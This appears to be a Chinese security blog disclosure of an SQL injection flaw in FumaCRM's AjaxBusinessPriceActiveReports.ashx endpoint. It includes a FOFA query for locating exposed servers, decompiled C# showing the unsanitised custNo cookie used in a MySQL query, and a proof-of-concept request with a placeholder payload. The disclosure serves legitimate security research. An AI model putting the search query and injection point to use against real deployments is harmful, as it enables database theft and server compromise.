---
title: "孚盟云CRM AjaxBusinessPriceActiveReports.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxBusinessPriceActiveReports-sqli.html
asset_dir: assets/孚盟云crm-ajaxbusinesspriceactivereports.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxBusinessPriceActiveReports.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/14 08:20
- 311浏览
- [0评论](#comment)
- 22分钟阅读

深入探索

安全

在线安全工具

漏洞修复方案

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxBusinessPriceActiveReports.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxBusinessPriceActiveReports.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxBusinessPriceActiveReports** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str = context.Request["action"];
  try
  {
    if (!string.op_Equality(str, "GetTempelateList"))
      return;
    this.GetTempelateList(context);
  }
  catch (Exception ex)
  {
    Helper.WriteLog($"GetTempelateList error message :{ex.Message} StackTrace:{ex.StackTrace}", "ddSaas");
  }
}
```

深入探索

服务器安全服务

Docker加速服务

计算机安全

当**action=GetTempelateList**时，看下`GetTempelateList`方法的实现

代码安全审计

```
public void GetTempelateList(HttpContext context)
{
  Helper.WriteLog("custNo:" + UserCookie.GetCookieValue("custNo"), "ddSaas");
  string cookieValue;
  if (string.op_Equality(UserCookie.GetCookieValue("custNo"), ""))
  {
    LicInfo licInfo = new BasePage().CheckLicNo();
    int num = licInfo.LicenseStr.IndexOf(":");
    cookieValue = licInfo.LicenseStr.Substring(num + 1, licInfo.LicenseStr.Length - num - 1).Replace("&&", "&").Split(new char[1]
    {
      '&'
    })[1];
    if (string.op_Equality(UserCookie.GetCookieValue("custNo"), ""))
      UserCookie.SetCookieValue("custNo", cookieValue);
  }
  else
  {
    cookieValue = UserCookie.GetCookieValue("custNo");
    Helper.WriteLog("CustNo:" + cookieValue, "ddSaas");
  }
  DataTable table = MySqlHelper.ExecuteDataSet(new EncryptData().DecryptString(MySqlHelper.DBConnectionString), (CommandType) 1, $" select * from Tempelate where  (ClientNumber is null or ClientNumber='{cookieValue}') and MouldID='SC002'").Tables[0];
```

当Cookie里的UserCookie的**custNo值不为空时**，**custNo** 未经过任何过滤或校验就被直接拼接进SQL语句中进行执行，从而造成SQL注入漏洞，这里需要注意数据库相关操作为MySQL数据库，而非sql server ！

漏洞预警服务

# 漏洞复现

> 漏洞利用需要注意，此处是MySQL数据库相关操作，并非mssql ！

```
POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"custNo":"')SQLI_POC-- -"}
Content-Type: application/x-www-form-urlencoded

action=GetTempelateList
```

[![孚盟云CRM AjaxBusinessPriceActiveReports.ashx SQL注入漏洞](images/img-001-23145c615762.webp)](https://image.mrxn.net/43aa4ada8ed94ec98364bef60c161a44.webp)

成功延时 4 秒

软件

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
